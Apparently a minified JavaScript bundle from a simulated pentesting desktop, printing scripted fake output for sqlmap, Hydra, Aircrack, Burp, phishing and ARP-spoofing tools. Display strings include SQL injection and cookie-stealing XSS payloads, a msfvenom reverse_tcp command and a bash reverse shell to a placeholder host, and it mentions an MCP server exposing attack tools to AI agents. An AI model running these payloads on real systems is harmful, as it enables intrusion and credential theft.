</span>`,`<span class="out-info">[*] starting @ ${new Date().toLocaleTimeString()}</span>`,`<span class="out-info">[*] testing connection to the target URL: ${t}</span>`,`<span class="out-success">[+] heuristic (basic) test shows that GET parameter 'id' might be injectable</span>`,`<span class="out-info">[*] testing for SQL injection on GET parameter 'id'</span>`,`<span class="out-info">[*] testing 'AND boolean-based blind - WHERE or HAVING clause'</span>`,`<span class="out-success">[+] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable</span>`,`<span class="out-success">[+] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable</span>`,`<span class="out-success">[+] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable</span>`,'<span class="out-success">[!] sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:</span>',`<span class="out-warn">---
Parameter: id (GET)
    Type: boolean-based blind
    Payload: id=1 AND 5175=5175

    Type: time-based blind
    Payload: id=1 AND SLEEP(5)

    Type: UNION query
    Payload: id=-1 UNION ALL SELECT NULL,CONCAT(0x7a70766a,0x4e4a47574d494c47527a,0x7870767a),NULL--
---</span>`,'<span class="out-info">[*] testing MySQL...</span>',`<span class="out-success">[+] dbms identified as 'MySQL'</span>`,'<span class="out-success">[*] fetching databases: information_schema, mysql, users_db, app_db, secret_data</span>'];s.innerHTML="",n.forEach((i,l)=>{setTimeout(()=>{const r=document.createElement("span");r.innerHTML=i+`
`,s.appendChild(r),s.scrollTop=s.scrollHeight,o.style.width=`${Math.floor((l+1)/n.length*100)}%`},l*400)})}function Xe(e){var i,l;const t=((i=document.getElementById(`hydra-ip-${e}`))==null?void 0:i.value)||"192.168.1.1",s=((l=document.getElementById(`hydra-svc-${e}`))==null?void 0:l.value)||"ssh",o=document.getElementById(`hydra-out-${e}`),n=document.getElementById(`hydra-bar-${e}`);if(!o)return;const a=['<span class="out-header">Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak</span>','<span class="out-info">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398)</span>',`<span class="out-info">[DATA] attacking ${s}://${t}:${s==="ssh"?22:21}/</span>`,`<span class="out-line">[ATTEMPT] target ${t} - login "admin" - pass "123456"</span>`,`<span class="out-line">[ATTEMPT] target ${t} - login "admin" - pass "password"</span>`,`<span class="out-line">[ATTEMPT] target ${t} - login "root" - pass "toor"</span>`,`<span class="out-line">[ATTEMPT] target ${t} - login "root" - pass "admin"</span>`,`<span class="out-success">[${s==="ssh"?22:21}][${s}] host: ${t}   login: admin   password: admin123</span>`,'<span class="out-success">1 of 1 target successfully completed, 1 valid password found</span>'];o.innerHTML="",a.forEach((r,b)=>setTimeout(()=>{const h=document.createElement("span");h.innerHTML=r+`
`,o.appendChild(h),o.scrollTop=o.scrollHeight,n.style.width=`${Math.floor((b+1)/a.length*100)}%`},b*400))}function Ye(e){const t=document.getElementById(`john-out-${e}`),s=document.getElementById(`john-bar-${e}`);if(!t)return;const o=['<span class="out-header">Using default input encoding: UTF-8</span>','<span class="out-info">Loaded 3 password hashes with 3 different salts (sha512crypt [SHA512 256/256 AVX2 4x])</span>','<span class="out-info">Cost 1 (iteration count) is 5000 for all loaded hashes</span>','<span class="out-info">Will run 8 OpenMP threads</span>',`<span class="out-info">Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status</span>`,'<span class="out-success">password123      (root)</span>','<span class="out-success">letmein          (admin)</span>','<span class="out-success">qwerty2023       (user1)</span>',`<span class="out-success">3g 0:00:00:23 DONE (${new Date().toLocaleString()}) 3 password hashes cracked, 0 left</span>`];t.innerHTML="",o.forEach((n,a)=>setTimeout(()=>{const i=document.createElement("span");i.innerHTML=n+`
`,t.appendChild(i),t.scrollTop=t.scrollHeight,s.style.width=`${Math.floor((a+1)/o.length*100)}%`},a*400))}function Ze(e){const t=document.getElementById(`john-out-${e}`);t&&(t.innerHTML+=`
<span class="out-success">root:password123:...
admin:letmein:...
user1:qwerty2023:...
3 password hashes cracked, 0 left</span>`)}function Ie(e){const t=document.getElementById(`air-out-${e}`),s=document.getElementById(`air-bar-${e}`);if(!t)return;const o=['<span class="out-info">[00:00:00] Aircrack-ng 1.7 starting...</span>','<span class="out-info">[00:00:01] Reading packets from capture.cap</span>','<span class="out-info">[00:00:02] 14344399 keys tested (4812.31 k/s)</span>','<span class="out-success">                         KEY FOUND! [ password123 ]</span>','<span class="out-success">Master Key     : CD D7 9A 5A CF B0 70 C7 E9 D1 02 3B 87 02 85 D7</span>','<span class="out-success">Transient Key  : 82 6F C2 77 B4 C3 72 90 DD F6 AA 37 5C A2 A7 2B</span>'];t.innerHTML="",o.forEach((n,a)=>setTimeout(()=>{const i=document.createElement("span");i.innerHTML=n+`
`,t.appendChild(i),t.scrollTop=t.scrollHeight,s.style.width=`${Math.floor((a+1)/o.length*100)}%`},a*600))}function et(e){const t=document.getElementById(`air-out-${e}`);t&&(t.innerHTML=`<span class="out-success">[*] PHY interface wlan0 renamed to wlan0mon
[*] Monitor mode enabled on wlan0mon</span>`)}function tt(e){var o;const t=(o=document.getElementById(`ws-filter-${e}`))==null?void 0:o.value,s=document.getElementById(`ws-status-${e}`);s&&(s.textContent=`Filter applied: "${t}" | Displaying filtered packets`)}function st(e){const t=document.getElementById(`ws-table-${e}`);if(!t)return;let s=15;const o=["TCP","UDP","HTTP","DNS","ARP","ICMP"],n=["192.168.1.101","10.0.0.5","172.16.0.2","192.168.1.1"],a=setInterval(()=>{if(s>50){clearInterval(a);return}const i=o[Math.floor(Math.random()*o.length)],l=n[Math.floor(Math.random()*n.length)],r=n[Math.floor(Math.random()*n.length)],b=Math.floor(Math.random()*1400)+40,h={TCP:"pkt-tcp",UDP:"pkt-udp",HTTP:"pkt-http",DNS:"pkt-dns",ARP:"pkt-arp",ICMP:"pkt-icmp"},T=t.tBodies[0].insertRow();T.innerHTML=`<td>${s}</td><td>${(s*.123).toFixed(3)}</td><td>${l}</td><td>${r}</td>
      <td class="${h[i]||""}">${i}</td><td>${b}</td><td class="out">${z(i)}</td>`,t.tBodies[0].scrollTop=t.tBodies[0].scrollHeight,s++},600)}function ot(e){const t=document.getElementById(`ws-status-${e}`);t&&(t.textContent="Capture stopped.")}function nt(e){const t=document.getElementById(`burp-intercept-${e}`);t&&(t.innerHTML=`<span class="out-success">[*] Proxy listening on 127.0.0.1:8080
[*] Waiting for connections...</span>`)}function at(e,t){document.querySelectorAll(`#burp-tabs-${t} .burp-tab`).forEach(o=>o.classList.remove("active")),event!=null&&event.target&&event.target.classList.add("active");const s=document.getElementById(`burp-body-${t}`);s&&(e==="repeater"?s.innerHTML=`
      <div style="display:flex;height:100%;gap:8px;padding:8px">
        <div style="flex:1;display:flex;flex-direction:column;background:var(--bg-darker);border:1px solid var(--border);border-radius:var(--radius);padding:8px">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
            <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--accent-cyan);font-weight:700">HTTP Request</span>
            <button class="tool-btn btn-primary" style="padding:4px 14px" onclick="sendBurpRepeater('${t}')">▶ Send</button>
          </div>
          <textarea id="burp-req-${t}" style="flex:1;background:transparent;border:none;color:var(--text-primary);font-family:var(--font-mono);font-size:0.75rem;resize:none;outline:none;line-height:1.5">GET /admin/dashboard.php HTTP/1.1
Host: 10.10.10.24
User-Agent: Mozilla/5.0 (BuildU-Pentest-OS)
Accept: text/html,application/xhtml+xml,application/xml
Authorization: Basic YWRtaW46YWRtaW4=
Cookie: PHPSESSID=buildu_sec_token_9988

{"action": "query_users", "limit": 10}</textarea>
        </div>
        <div style="flex:1;display:flex;flex-direction:column;background:var(--bg-darker);border:1px solid var(--border);border-radius:var(--radius);padding:8px">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
            <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--accent-green);font-weight:700">HTTP Response</span>
            <span id="burp-resp-status-${t}" style="font-family:var(--font-mono);font-size:0.72rem;color:var(--accent-green)">200 OK (18ms)</span>
          </div>
          <div id="burp-resp-${t}" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:0.75rem;color:var(--text-secondary);white-space:pre-wrap;line-height:1.5">HTTP/1.1 200 OK
Date: ${new Date().toUTCString()}
Server: Apache/2.4.52 (Ubuntu)
Content-Type: application/json; charset=utf-8
Content-Length: 178
Connection: close

{
  "status": "authenticated",
  "user": "root_admin",
  "privileges": "SUPERUSER",
  "secret_token": "BUILDU{REPEATER_INTERCEPT_SUCCESS_2026}"
}</div>
        </div>
      </div>
    `:e==="decoder"?s.innerHTML=`
      <div style="padding:12px;display:flex;flex-direction:column;gap:10px;height:100%">
        <div class="tool-section-title">Burp Decoder - Encode / Decode Utility</div>
        <textarea id="dec-in-${t}" style="height:90px;background:var(--bg-darker);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);padding:8px;font-family:var(--font-mono);font-size:0.8rem;outline:none" placeholder="Enter text or encoded payload to transform...">admin' OR '1'='1</textarea>
        <div class="tool-row">
          <button class="tool-btn" onclick="burpDecodeAction('b64e','${t}')">Base64 Encode</button>
          <button class="tool-btn" onclick="burpDecodeAction('b64d','${t}')">Base64 Decode</button>
          <button class="tool-btn" onclick="burpDecodeAction('urle','${t}')">URL Encode</button>
          <button class="tool-btn" onclick="burpDecodeAction('urld','${t}')">URL Decode</button>
          <button class="tool-btn" onclick="burpDecodeAction('hex','${t}')">Hex Encode</button>
        </div>
        <div class="tool-output" id="dec-out-${t}" style="flex:1;min-height:120px">
          <span class="out-info">// Click an operation button above to transform your payload.</span>
        </div>
      </div>
    `:s.innerHTML=`
      <div id="burp-proxy-${t}" class="burp-section">
        <div class="tool-section">
          <div class="tool-section-title">Proxy Settings</div>
          <div class="tool-row">
            <div class="tool-field"><label>Listen Port</label><input class="tool-input" value="8080" id="burp-port-${t}" /></div>
            <div class="tool-field"><label>Bind Address</label><input class="tool-input" value="127.0.0.1" id="burp-bind-${t}" /></div>
            <div class="tool-field" style="justify-content:flex-end">
              <button class="tool-btn btn-success" onclick="toggleProxy('${t}')">▶ Start Proxy</button>
            </div>
          </div>
        </div>
        <div class="tool-section">
          <div class="tool-section-title">Intercepted Requests</div>
          <div class="tool-output" style="min-height:160px" id="burp-intercept-${t}">
            <span class="out-info">// Proxy is listening on 127.0.0.1:8080. Interception active.</span>
          </div>
        </div>
      </div>
    `)}function it(e){var o;(o=document.getElementById(`burp-req-${e}`))!=null&&o.value;const t=document.getElementById(`burp-resp-${e}`),s=document.getElementById(`burp-resp-status-${e}`);t&&(typeof playAudio=="function"&&playAudio("click"),t.textContent="Sending request to target server...",setTimeout(()=>{s&&(s.textContent="200 OK (22ms)"),t.textContent=`HTTP/1.1 200 OK
Date: ${new Date().toUTCString()}
Server: Apache/2.4.52 (Ubuntu)
Content-Type: application/json; charset=utf-8
Content-Length: 184
X-Powered-By: BuildU-SecEngine
Connection: close

{
  "authenticated": true,
  "role": "administrator",
  "session": "tok_${Math.random().toString(36).substring(2,10)}",
  "message": "Access granted to admin panel"
}`,typeof showToast=="function"&&showToast("Repeater Response","HTTP 200 OK received (22ms)","success","⚡")},350))}function lt(e,t){var a;const s=((a=document.getElementById(`dec-in-${t}`))==null?void 0:a.value)||"",o=document.getElementById(`dec-out-${t}`);if(!o)return;let n="";try{e==="b64e"?n=btoa(s):e==="b64d"?n=atob(s):e==="urle"?n=encodeURIComponent(s):e==="urld"?n=decodeURIComponent(s):e==="hex"&&(n=Array.from(s).map(i=>i.charCodeAt(0).toString(16).padStart(2,"0")).join(" ")),o.innerHTML=`<span class="out-success">[+] Result (${e}):</span>
<span class="out-line" style="color:var(--text-primary);font-size:0.85rem">${escHtml(n)}</span>`,typeof playAudio=="function"&&playAudio("success")}catch(i){o.innerHTML=`<span class="out-err">[!] Error transforming input: ${i.message}</span>`}}function rt(e,t,s){document.querySelectorAll(".settings-section").forEach(n=>n.classList.remove("active"));const o=document.getElementById(`settings-${e}-${t}`);o&&o.classList.add("active"),s.closest(".settings-sidebar").querySelectorAll(".settings-sidebar-item").forEach(n=>n.classList.remove("active")),s.classList.add("active")}function ct(e,t,s){document.documentElement.style.setProperty("--accent-cyan",e),s.closest(".color-picker-row").querySelectorAll(".color-swatch").forEach(o=>o.classList.remove("active")),s.classList.add("active")}function dt(e){const t=e.checked?"0.97":"1";document.documentElement.style.setProperty("--panel-alpha",t)}function pt(e,t){}function ut(e,t){var o;if(e.key!=="Enter"&&e.type!=="click")return;const s=(o=document.getElementById(`browser-url-${t}`))==null?void 0:o.value;I(s,t)}function mt(e){var o;const t=(o=document.getElementById(`browser-search-${e}`))==null?void 0:o.value,s=document.getElementById(`browser-body-${e}`);s&&t&&(s.innerHTML=`<div style="padding:20px;font-family:var(--font-mono);font-size:0.82rem;">
      <p style="color:var(--accent-cyan);margin-bottom:16px">Search results for: "${t}"</p>
      ${["CVE-2023-44487 - HTTP/2 Rapid Reset Attack","Exploit for "+t+" - Exploit-DB","GitHub - hacking-tool for "+t].map(n=>`<div style="padding:10px;border:1px solid var(--border);border-radius:4px;margin-bottom:8px;cursor:pointer;color:var(--text-secondary)">${n}</div>`).join("")}
    </div>`)}function I(e,t){const s=document.getElementById(`browser-body-${t}`);s&&(s.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:200px;font-family:var(--font-mono);color:var(--text-dim)">
    <span>🌐 Loading: ${e}...<br><br><span style="color:var(--accent-orange)">Note: External URLs are simulated in this environment.</span></span>
  </div>`)}function vt(e,t,s,o,n){document.querySelectorAll(`#ws-table-${n} tr`).forEach(r=>r.classList.remove("selected")),e&&e.classList.add("selected");const a=document.getElementById(`ws-details-${n}`),i=document.getElementById(`ws-hex-${n}`);if(!a||!i)return;const l=Math.floor(Math.random()*800)+64;a.innerHTML=`
    <div style="color:var(--accent-cyan);font-weight:700">▶ Frame 1: ${l} bytes on wire (${l*8} bits) on interface eth0</div>
    <div style="color:var(--text-primary)">▶ Ethernet II, Src: Intel_00:1a (00:1a:2b:3c:4d:5e), Dst: Gateway_c0 (00:50:56:c0:00:01)</div>
    <div style="color:var(--text-primary)">▶ Internet Protocol Version 4, Src: ${s}, Dst: ${o}</div>
    <div style="color:${t==="TCP"?"#4fc3f7":t==="UDP"?"#81c784":"#ffb74d"}">▶ ${t} Protocol (Src port: 54321, Dst port: 80, Seq: 1, Ack: 1, Len: ${l})</div>
    ${t==="HTTP"?'<div style="color:#ffb74d">▶ Hypertext Transfer Protocol: GET /admin/dashboard.php HTTP/1.1\\r\\n</div>':""}
    ${t==="DNS"?'<div style="color:#80deea">▶ Domain Name System (query: target.corp A record)\\r\\n</div>':""}
  `,i.textContent=`0000   00 50 56 c0 00 01 00 1a  2b 3c 4d 5e 08 00 45 00   .PV.....+<M^..E.
0010   00 3c 4a 2e 40 00 40 06  3b 1f c0 a8 01 64 5d b8   .<J.@.@.;....d].
0020   d8 22 d4 31 00 50 7a 4f  1c 3e 00 00 00 00 a0 02   .".1.PzO.>......
0030   fa f0 31 74 00 00 02 04  05 b4 01 03 03 08 01 01   ..1t............`,typeof playAudio=="function"&&playAudio("click")}function F(e,t){const s=document.getElementById(`fm-grid-${e}`),o=document.getElementById(`fm-path-${e}`),n=document.getElementById(`fm-status-${e}`);if(!s||!window.VFS)return;const a=window.VFS.resolve(t);o&&(o.textContent=a);const i=window.VFS.list(a);s.innerHTML=i.map(l=>`
    <div class="fm-item" ondblclick="fmOpen('${l.name}', ${l.isDir}, '${e}')" title="${l.name} (${l.isDir?"Directory":(l.size||0)+" bytes"})">
      <div class="fm-icon">${l.icon}</div>
      <span style="font-size:0.72rem;word-break:break-all">${l.name}</span>
    </div>
  `).join(""),n&&(n.textContent=`${i.length} items in ${a} | BuildU VFS`)}window.addEventListener("vfs-change",()=>{document.querySelectorAll(".fm-path").forEach(e=>{const t=e.id.replace("fm-path-","");F(t,e.textContent)})});function ft(e,t){const s=document.getElementById(`fm-path-${t}`);if(!s||!window.VFS)return;let o=s.textContent;if(e==="up"){const n=o.split("/").slice(0,-1).join("/")||"/";G(n,t)}}function G(e,t,s){var n;const o=window.VFS?window.VFS.resolve(e):e;F(t,o),s&&((n=s.closest(".fm-sidebar"))==null||n.querySelectorAll(".fm-sidebar-item").forEach(a=>a.classList.remove("active")),s.classList.add("active"))}function bt(e,t,s){const o=document.getElementById(`fm-path-${s}`),n=o?o.textContent:"/root",a=n==="/"?"/"+e:n+"/"+e;t?G(a,s):(openApp("texteditor"),setTimeout(()=>{const i=document.querySelector(".editor-area"),l=document.querySelector(".editor-filename");if(i&&window.VFS){i.value=window.VFS.read(a)||"",l&&(l.value=a);const r=document.querySelector(".editor-statusbar");r&&(r.querySelector("span:nth-child(2)").textContent=a),typeof showToast=="function"&&showToast("File Opened",`Loaded ${a} from BuildU VFS`,"info","📝")}},350))}function ht(e,t){const s=document.getElementById(`fm-path-${t}`),o=s?s.textContent:"/root",n=prompt(`Enter new ${e} name:`);if(!n||!window.VFS)return;const a=o==="/"?"/"+n:o+"/"+n;e==="dir"?window.VFS.mkdir(a):window.VFS.write(a,""),F(t,o),typeof showToast=="function"&&showToast("Created",`Created ${e} '${n}' in ${o}`,"success","📁")}function yt(e){const t=document.getElementById(`editor-area-${e}`);t&&(t.value=""),K(e)}function gt(e){const t=document.getElementById(`editor-area-${e}`),s=(t==null?void 0:t.value)??"",o=prompt("Save file path in BuildU VFS:","/root/notes.md");if(!o)return;window.VFS&&window.VFS.write(o,s);const n=new Blob([s],{type:"text/plain"}),a=document.createElement("a");a.href=URL.createObjectURL(n),a.download=o.split("/").pop()||"buildu-file.txt",a.click(),typeof showToast=="function"&&showToast("File Saved",`Saved to ${o} in BuildU VFS`,"success","💾")}function $t(e){const t=document.getElementById(`editor-area-${e}`),s=window.VFS?Object.keys(window.VFS.files).join(`
`):"",o=prompt(`Enter VFS file path to open:
Available:
${s}`,"/root/notes.md");if(o&&window.VFS&&t){const n=window.VFS.read(o);n!==null?(t.value=n,K(e),typeof showToast=="function"&&showToast("Loaded File",`Loaded ${o}`,"info","📄")):alert(`File ${o} does not exist in VFS.`)}}function K(e){const t=document.getElementById(`editor-area-${e}`),s=document.getElementById(`editor-lines-${e}`);if(!t||!s)return;const o=(t.value.match(/\n/g)||[]).length+1;s.textContent=Array.from({length:o},(n,a)=>a+1).join(`
`)}function xt(e){const t=document.getElementById(`editor-area-${e}`),s=document.getElementById(`editor-lines-${e}`);t&&s&&(s.scrollTop=t.scrollTop)}function St(e){["nmap-bar","hash-bar","sql-bar","hydra-bar","john-bar","air-bar","nikto-bar","ova-bar","wp-bar","xss-bar","dirb-bar","wl-bar","wifi-bar","kismet-bar","set-bar","sg-bar","arp-bar","ssl-bar","bw-bar","aut-bar","steg-bar","tr-bar","sub-bar","dns-bar","whois-bar"].forEach(t=>{const s=document.getElementById(`${t}-${e}`);s&&(s.style.width="0%")})}function Tt(e){["nmap-out","hash-out","sql-out","hydra-out","john-out","air-out","nikto-out","ova-out","wp-out","xss-out","dirb-out","wl-out","wifi-out","kismet-out","set-out","sg-out","arp-out","ssl-out","bw-out","aut-out","steg-out","tr-out","sub-out","dns-out","whois-out","msf-out"].forEach(t=>{const s=document.getElementById(`${t}-${e}`);s&&(s.innerHTML='<span class="out-info">// Output cleared.</span>')})}function M(e,t,s,o,n=350){const a=document.getElementById(t),i=document.getElementById(s);a&&(a.innerHTML="",o.forEach((l,r)=>setTimeout(()=>{const b=document.createElement("span");b.innerHTML=l+`
`,a.appendChild(b),a.scrollTop=a.scrollHeight,i&&(i.style.width=`${Math.floor((r+1)/o.length*100)}%`)},r*n)))}function kt(e){var s;const t=((s=document.getElementById(`whois-domain-${e}`))==null?void 0:s.value)||"example.com";M(e,`whois-out-${e}`,`whois-bar-${e}`,[`<span class="out-header">[*] Querying WHOIS for: ${t}</span>`,`<span class="out-info">Domain Name: ${t.toUpperCase()}</span>`,'<span class="out-line">Registrar: GoDaddy.com, LLC</span>','<span class="out-line">Created: 2010-05-15</span>','<span class="out-line">Expires: 2025-05-15</span>','<span class="out-line">Registrant: John Doe, Example Corp</span>',`<span class="out-line">Name Servers: ns1.${t} ns2.${t}</span>`,'<span class="out-success">DNSSEC: unsigned</span>'])}function Et(e){var o,n;const t=((o=document.getElementById(`dns-domain-${e}`))==null?void 0:o.value)||"example.com",s=((n=document.getElementById(`dns-type-${e}`))==null?void 0:n.value)||"A";M(e,`dns-out-${e}`,`dns-bar-${e}`,[`<span class="out-header">[*] DNS Lookup: ${s} records for ${t}</span>`,`<span class="out-success">${t}. 300 IN A 93.184.216.34</span>`,`<span class="out-success">${t}. 300 IN A 93.184.216.35</span>`,'<span class="out-line">;; Query time: 12 msec</span>','<span class="out-line">;; SERVER: 8.8.8.8#53(8.8.8.8)</span>'])}function Ct(e){var o;const t=((o=document.getElementById(`tr-host-${e}`))==null?void 0:o.value)||"google.com",s=["192.168.1.1","10.0.0.1","74.125.1.1","72.14.209.49","108.170.245.65",t].map((n,a)=>`<span class="out-line">${a+1}  ${n}  ${(Math.random()*20+2).toFixed(3)} ms</span>`);M(e,`tr-out-${e}`,`tr-bar-${e}`,[`<span class="out-header">traceroute to ${t}</span>`,...s,'<span class="out-success">Trace complete.</span>'])}function wt(e){var o;const t=((o=document.getElementById(`sub-domain-${e}`))==null?void 0:o.value)||"example.com",s=["www","mail","ftp","admin","api","dev","staging","vpn","git","smtp"].map(n=>`<span class="out-success">[+] ${n}.${t}  →  ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}</span>`);M(e,`sub-out-${e}`,`sub-bar-${e}`,[`<span class="out-header">[*] Enumerating subdomains for ${t}...</span>`,...s,'<span class="out-success">[*] Found 10 subdomains</span>'])}function Mt(e){var t;(t=document.getElementById(`nikto-url-${e}`))!=null&&t.value,M(e,`nikto-out-${e}`,`nikto-bar-${e}`,['<span class="out-header">- Nikto v2.1.6/2.1.5</span>','<span class="out-info">+ Target IP: 93.184.216.34</span>','<span class="out-warn">+ Server: Apache/2.4.54</span>','<span class="out-err">+ OSVDB-3092: /admin/: This might be interesting...</span>','<span class="out-err">+ /phpinfo.php: PHP information found</span>','<span class="out-warn">+ /robots.txt: Contains 3 disallowed entries</span>','<span class="out-err">+ Apache/2.4.54 appears to be outdated (current is at least Apache/2.4.57)</span>','<span class="out-success">+ 7 host(s) tested</span>'])}function Pt(e){M(e,`ova-out-${e}`,`ova-bar-${e}`,['<span class="out-header">[*] OpenVAS 22.4.1 starting scan...</span>','<span class="out-warn">[MEDIUM] SSH Weak Encryption Algorithms Supported</span>','<span class="out-err">[HIGH] MS17-010: SMB Remote Code Execution</span>','<span class="out-warn">[MEDIUM] HTTP Server Allows Insecure HTTP Methods</span>','<span class="out-err">[CRITICAL] SSL/TLS: OpenSSL Heartbleed Vulnerability</span>','<span class="out-success">[*] Scan complete. 4 vulnerabilities found.</span>'])}function At(e){var s;const t=((s=document.getElementById(`wp-url-${e}`))==null?void 0:s.value)||"http://wp.example.com";M(e,`wp-out-${e}`,`wp-bar-${e}`,['<span class="out-header">_  _____  _____                </span>',`<span class="out-info">[*] Scanning WordPress at ${t}</span>`,'<span class="out-warn">[!] WordPress version 5.4.2 identified (EOL)</span>','<span class="out-err">[!] Plugin: contact-form-7 v5.1.1 - SQL Injection vulnerability</span>','<span class="out-warn">[i] Theme: twentytwenty v1.2</span>','<span class="out-success">[i] User identified: admin</span>'])}function Lt(e){M(e,`xss-out-${e}`,`xss-bar-${e}`,['<span class="out-info">[*] Starting XSS scan...</span>','<span class="out-warn">[?] Testing: &lt;script&gt;alert(1)&lt;/script&gt;</span>','<span class="out-warn">[?] Testing: &lt;img src=x onerror=alert(1)&gt;</span>','<span class="out-err">[+] Reflected XSS found in parameter: search</span>','<span class="out-err">[+] Payload: &lt;img src=x onerror=alert(document.cookie)&gt;</span>','<span class="out-success">[*] 1 XSS vulnerability found</span>'])}function Ht(e){var s;const t=((s=document.getElementById(`dirb-url-${e}`))==null?void 0:s.value)||"http://target.com";M(e,`dirb-out-${e}`,`dirb-bar-${e}`,['<span class="out-header">DirBuster 1.0-RC1</span>',`<span class="out-success">+ ${t}/admin (CODE:200|SIZE:4521)</span>`,`<span class="out-success">+ ${t}/login (CODE:200|SIZE:2134)</span>`,`<span class="out-success">+ ${t}/backup (CODE:301|SIZE:0)</span>`,`<span class="out-warn">+ ${t}/.git (CODE:403|SIZE:289)</span>`,`<span class="out-success">+ ${t}/phpinfo.php (CODE:200|SIZE:47392)</span>`,'<span class="out-success">[*] Total: 5 directories/files found</span>'])}function Bt(e){var a,i,l;const t=((a=document.getElementById(`wl-min-${e}`))==null?void 0:a.value)||4,s=((i=document.getElementById(`wl-max-${e}`))==null?void 0:i.value)||6,o=((l=document.getElementById(`wl-charset-${e}`))==null?void 0:l.value)||"abc123",n=["aaaa","aaab","aaac","aa12","ab12","abc1","1234","1a2b","abcd","zyx9","test","pass"].filter(r=>r.length>=t&&r.length<=s);M(e,`wl-out-${e}`,`wl-bar-${e}`,[`<span class="out-info">Generating wordlist... (length ${t}-${s}, charset: ${o})</span>`,...n.map(r=>`<span class="out-line">${r}</span>`),`<span class="out-success">[+] Generated ${n.length} words (preview only)</span>`])}function _t(e){M(e,`wifi-out-${e}`,`wifi-bar-${e}`,['<span class="out-header">WiFi Analyzer - Detected Networks</span>','<span class="out-success">HomeNetwork_5G    CH:36  -62dBm  WPA2  AA:BB:CC:DD:EE:01</span>','<span class="out-line">NETGEAR_Office    CH:11  -71dBm  WPA2  11:22:33:44:55:02</span>','<span class="out-warn">OldRouter         CH:1   -55dBm  WEP   DE:AD:BE:EF:00:03</span>','<span class="out-success">SecureNet_2.4     CH:6   -67dBm  WPA3  00:11:22:33:44:05</span>'])}function Dt(e){M(e,`kismet-out-${e}`,`kismet-bar-${e}`,['<span class="out-header">Kismet 2023-07-R1 starting...</span>','<span class="out-info">[*] Sourcetracker spawned</span>','<span class="out-success">[+] Found SSID: HomeNetwork_5G</span>','<span class="out-success">[+] Found SSID: SecureNet</span>','<span class="out-warn">[!] WEP network detected: OldRouter</span>'])}function Ft(e){M(e,`set-out-${e}`,`set-bar-${e}`,['<span class="out-header">Social-Engineer Toolkit 8.0.3</span>','<span class="out-info">[*] Loading attack module...</span>','<span class="out-warn">[*] Phishing page cloned successfully</span>','<span class="out-success">[*] Listening on port 80 for credentials...</span>','<span class="out-success">[+] Credentials received: admin:password123</span>'])}function Ot(e){var o,n;const t=((o=document.getElementById(`sg-lhost-${e}`))==null?void 0:o.value)||"192.168.1.100",s=((n=document.getElementById(`sg-lport-${e}`))==null?void 0:n.value)||"4444";M(e,`sg-out-${e}`,`sg-bar-${e}`,['<span class="out-header">[*] Generating payload...</span>',`<span class="out-info">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${t} LPORT=${s} -f elf</span>`,'<span class="out-success">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span>','<span class="out-success">[*] Payload size: 250 bytes</span>','<span class="out-success">[*] Final size of elf file: 370 bytes</span>','<span class="out-success">[+] Saved as: /root/payload.elf</span>',`<span class="out-warn">bash -i >& /dev/tcp/${t}/${s} 0>&1</span>`])}function Rt(e){var o,n;const t=((o=document.getElementById(`arp-target-${e}`))==null?void 0:o.value)||"192.168.1.1",s=((n=document.getElementById(`arp-gateway-${e}`))==null?void 0:n.value)||"192.168.1.254";M(e,`arp-out-${e}`,`arp-bar-${e}`,['<span class="out-warn">[!] ARP poisoning attack started</span>',`<span class="out-info">[*] Sending ARP replies to ${t} spoofing ${s}</span>`,`<span class="out-info">[*] Sending ARP replies to ${s} spoofing ${t}</span>`,'<span class="out-success">[+] MITM position established. Forwarding enabled.</span>'])}function Nt(e){M(e,`ssl-out-${e}`,`ssl-bar-${e}`,['<span class="out-warn">[!] SSLStrip 0.9 starting...</span>','<span class="out-info">[*] Listening on port 8080</span>','<span class="out-success">[+] HTTPS → HTTP downgrade active</span>','<span class="out-warn">[!] Credentials captured: username=admin&password=secret123</span>'])}function Ut(e){M(e,`bw-out-${e}`,`bw-bar-${e}`,['<span class="out-header">DECIMAL       HEXADECIMAL     DESCRIPTION</span>','<span class="out-success">0             0x0             TRX firmware header, image size: 6000640</span>','<span class="out-info">28            0x1C            LZMA compressed data</span>','<span class="out-success">1310720       0x140000        Squashfs filesystem, LE</span>','<span class="out-info">5242880       0x500000        JFFS2 filesystem</span>'])}function Wt(e){M(e,`aut-out-${e}`,`aut-bar-${e}`,['<span class="out-header">[*] Autopsy 4.21.0 starting analysis...</span>','<span class="out-info">[*] Parsing file system: NTFS</span>','<span class="out-success">[+] 23,451 files indexed</span>','<span class="out-warn">[!] Deleted files found: 142</span>','<span class="out-err">[!] Suspicious file: /Users/Admin/secret_docs.zip</span>','<span class="out-success">[*] Analysis complete</span>'])}function qt(e){M(e,`steg-out-${e}`,`steg-bar-${e}`,['<span class="out-info">[*] Steghide 0.5.1 starting...</span>','<span class="out-success">[+] Hidden data found in image</span>','<span class="out-success">[+] Extracted to: hidden_message.txt</span>','<span class="out-warn">Contents: "The flag is: CTF{hidden_in_plain_sight}"</span>'])}window.MCP_STATE=window.MCP_STATE||{servers:[{id:"buildu-sec",name:"buildu-security-mcp",status:"online",transport:"stdio / JSON-RPC",port:"8765",toolsCount:6,desc:"Model Context Protocol server exposing BuildU pentest tools (Nmap, SQLMap, Hash Cracker, DirBuster, Metasploit, Shellgen) to AI agents.",latency:"12ms"},{id:"mcp-rag",name:"mcp-server-rag",status:"online",transport:"FastAPI / SSE",port:"8000",toolsCount:3,desc:"ChromaDB vector store + LangChain RAG engine from mcp-hub/llm for threat intel and CVE 